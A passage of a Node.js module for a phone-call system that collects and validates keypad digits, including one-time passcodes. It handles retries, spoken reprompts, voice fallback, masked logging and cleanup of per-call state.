            completed_at: new Date().toISOString()
          }).catch(() => {});
          const planShouldEnd = allowCallEnd && plan.end_call_on_success !== false;
          clearDigitIntent(callSid, 'digit_plan_completed');
          if (planShouldEnd) {
            const completionMessage = plan.completion_message || closingMessage;
            await speakAndEndCall(callSid, completionMessage, 'digits_collected_plan');
            return;
          }
          if (gptService) {
            const completionMessage = plan.completion_message || 'Thanks, I have all the digits I need.';
            emitReply(completionMessage);
          }
          return;
        }
      }

      clearDigitIntent(callSid);
      if (shouldEndCall) {
        await speakAndEndCall(
          callSid,
          closingMessage,
          (collection.profile === 'verification' || collection.profile === 'otp') ? 'otp_verified' : 'digits_collected'
        );
        return;
      }
      const confirmation = buildConfirmationMessage(expectation || {}, collection);
      if (confirmation) {
        emitReply(confirmation);
      }
      return;
    } else {
      const reasonHint = collection.reason ? ` (${collection.reason.replace(/_/g, ' ')})` : '';
      webhookService.addLiveEvent(callSid, `⚠️ Invalid digits (${collection.len})${reasonHint}; retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`, { force: true });
      if (collection.fallback) {
        const failureMessage = expectation?.failure_message || callEndMessages.failure || 'I could not verify the digits. Thank you for your time.';
        const fallbackMsg = fallbackToVoiceOnFailure
          ? 'I could not verify the digits. I will continue the call without keypad entry.'
          : failureMessage;
        webhookService.addLiveEvent(callSid, `⏳ No valid digits; ${fallbackToVoiceOnFailure ? 'switching to voice' : 'ending call'}`, { force: true });
        digitCollectionManager.expectations.delete(callSid);
        clearDigitTimeout(callSid);
        clearDigitFallbackState(callSid);
        clearDigitPlan(callSid);
        if (fallbackToVoiceOnFailure) {
          emitReply(fallbackMsg);
          return;
        }
        if (allowCallEnd) {
          await speakAndEndCall(callSid, failureMessage, 'digit_collection_failed');
          return;
        }
        emitReply(fallbackMsg);
      } else {
        let prompt = '';
        if (collection.reason === 'too_fast') {
          prompt = 'That was too fast. Please enter the digits again slowly.';
        } else if (collection.reason === 'spam_pattern') {
          prompt = 'That pattern did not look right. Please enter the correct digits now.';
        } else if (collection.reason === 'too_short') {
          prompt = chooseReprompt(expectation || {}, 'incomplete', collection.retries || 1)
            || `Please enter the ${expectedLabel} now.`;
        } else {
          prompt = chooseReprompt(expectation || {}, 'invalid', collection.retries || 1)
            || `Please enter the ${expectedLabel} now.`;
        }
        emitReply(prompt);
        if (gptService) {
          scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
        }
      }
    }

    const summary = collection.accepted
      ? collection.route
        ? `✅ Digits accepted • routed: ${collection.route}`
        : (collection.profile === 'verification' || collection.profile === 'otp')
          ? `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'length' : 'masked')}`
          : `✅ Digits accepted (${collection.len})`
      : collection.fallback
        ? '⚠️ Digits failed after retries'
        : `⚠️ Invalid digits (${collection.len}); retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`;
    webhookService.addLiveEvent(callSid, summary, { force: true });
  }

  function clearCallState(callSid) {
    digitCollectionManager.expectations.delete(callSid);
    clearDigitTimeout(callSid);
    clearDigitFallbackState(callSid);
    clearDigitPlan(callSid);
    lastDtmfTimestamps.delete(callSid);
    pendingDigits.delete(callSid);
  }

  return {
    expectations: digitCollectionManager.expectations,
    buildDigitPrompt,
    buildTwilioGatherTwiml,
    clearCallState,
    clearDigitFallbackState,
    clearDigitPlan,
    clearDigitTimeout,
    determineDigitIntent,
    formatDigitsGeneral,
    formatOtpForDisplay,
    getExpectation: (callSid) => digitCollectionManager.expectations.get(callSid),
    getOtpContext,
    handleCollectionResult,
    hasExpectation: (callSid) => digitCollectionManager.expectations.has(callSid),
    inferDigitExpectationFromText,
    markDigitPrompted,
    maskOtpForExternal,
    normalizeDigitExpectation,
    bufferDigits,
    flushBufferedDigits,
    prepareInitialExpectation,
    recordDigits: (callSid, digits, meta) => digitCollectionManager.recordDigits(callSid, digits, meta),
    requestDigitCollection,
    requestDigitCollectionPlan,
    scheduleDigitTimeout,
    setExpectation: (callSid, params) => digitCollectionManager.setExpectation(callSid, params),
    isFallbackActive: (callSid) => digitFallbackStates.get(callSid)?.active === true,
    hasPlan: (callSid) => digitCollectionPlans.has(callSid)
  };
}

module.exports = {
  createDigitCollectionService
};
